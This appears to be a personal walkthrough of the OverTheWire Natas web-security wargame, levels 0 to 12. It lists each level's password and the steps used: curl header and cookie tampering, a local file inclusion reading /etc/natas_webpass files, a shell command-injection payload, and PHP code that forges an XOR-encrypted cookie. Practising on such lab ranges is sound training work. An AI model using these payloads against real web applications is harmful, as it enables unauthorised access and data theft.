OverTheWire: Natas

natas0
url: http://natas0.natas.labs.overthewire.org
password: natas0

natas0 -> natas1
url: http://natas1.natas.labs.overthewire.org
found in html: cmd + shift + c
password:g9D9cREhslqBKtcA2uocGHPfMZVzeFK6

natas1 -> natas2
url: http://natas2.natas.labs.overthewire.org
found in html
password: h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7

natas2 -> natas3
url: http://natas3.natas.labs.overthewire.org
found by navigating to http://natas3.natas.labs.overthewire.org/files
within the users.txt file is where the password is stored
password: G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q

natas3 -> natas4
url: http://natas4.natas.labs.overthewire.org
found by navigating to http://natas4.natas.labs.overthewire.org/robots.txt
robots.txt is a standard used by websites to communicate with web crawlers (like Google) and other web robots
then navigating to http://natas4.natas.labs.overthewire.org/s3cr3t
within the users.txt file is where the password is stored
password: tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm

natas4 -> natas5
url: http://natas5.natas.labs.overthewire.org
found by adding a header through curl: 
 curl -v http://natas4.natas.labs.overthewire.org/index.php -u "natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm" -H "Referer:http://natas5.natas.labs.overthewire.org/"
the -H flag allows you to add a header
password: Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD

natas5 -> natas6
url: http://natas6.natas.labs.overthewire.org
found by changing the cookie value through curl:
curl -v -b "loggedin=1" http://natas5.natas.labs.overthewire.org -u "natas5:Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD"
the -b flag allows you to change the cookies
password: fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR

natas6 -> natas7
url: http://natas7.natas.labs.overthewire.org
found by accessing the source code for the index.html page: http://natas6.natas.labs.overthewire.org/index-source.html
see that it includes the file includes/secret.inc
navigate to http://natas6.natas.labs.overthewire.org/includes/secret.inc
$secret = "FOEIUWGHFEEUHOFUOIU"
password: jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr

natas7 -> natas8
url: http://natas8.natas.labs.overthewire.org
first went to console page for home and about pages to find the below hint
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
navigated to http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
password: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB

natas8 -> natas9
url: http://natas9.natas.labs.overthewire.org
first view index-source.html
gives you an encoded secret and how it was encoded
using an online php compiler, reverse the encoded secret
<?php
echo base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));
?>
after inputting the decoded secret, given the password
password: Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd

natas9 -> natas10
url: http://natas10.natas.labs.overthewire.org
the search bar on the screen introduces a vulnerability since none of the searches are validated
can type a command into the search bar to output the password
into the search bar: ;cat /etc/natas_webpass/natas10;
password:D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE

natas10 -> natas11
url: http://natas11.natas.labs.overthewire.org
the search bar now prevents the search of illegal characters "; &"
grep allows you to search in multiple files at once
search for a random charcter that may or may not be in the password
into the search bar: F /ect/natas_webpass/natas11
password:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg

natas11 -> natas12
url: http://natas12.natas.labs.overthewire.org
viewing the source code we see that we are given the default data, xor function, and an encrypted cookie
xor rules: a xor b = c; a xor b xor b = c xor b; a = c xor b
need to xor the cookie decoded with base64 and the default data encoded with json encrypt to find the key used for the xor encrypt of the password
<?php
    $decodecookie = base64_decode("MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgu".
    "bjY%3D");
    $defaultdata = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
    $text = '';
    for($i=0;$i<strlen($decodecookie);$i++) {
            $text .= $decodecookie[$i] ^ $defaultdata[$i];
    }
    echo $text, "\n";
?>
given the key: KNHL
then need to change the default data to say "showpassword"=>"yes"
<?php
    $key = "KNHL";
    $mydata = json_encode(array("showpassword"=>"yes", "bgcolor"=>"#ffffff"));
    $cookie = '';
    for($i=0;$i<strlen($mydata);$i++) {
            $cookie .= $mydata[$i] ^ $key[$i % strlen($key)];
    }
    echo base64_encode($cookie);
?>
newcookie:MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz
then need to change the cookie to the new coookie
curl -v -b "data=MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz" http://natas11.natas.labs.overthewire.org/ -u "natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg"
password: YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG

natas12 -> natas13
url: http://natas13.natas.labs.overthewire.org 

